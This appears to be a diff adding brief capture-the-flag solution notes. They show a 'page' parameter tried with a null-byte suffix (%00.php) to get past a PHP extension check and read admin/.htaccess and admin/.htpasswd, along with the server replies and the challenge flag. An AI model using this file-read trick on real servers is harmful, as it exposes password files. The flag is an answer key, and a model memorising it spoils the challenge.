@@ -1,0 +1,6 @@
+page=admin/.htaccess 
+	file not ending in .php, terminating.
+page=admin/.htaccess%00.php
+	You are really close... but not there yet, maybe you're reading the wrong file?
+page=admin/.htpasswd%00.php
+	Great work! the flag is brixelCTF{outdated_php}
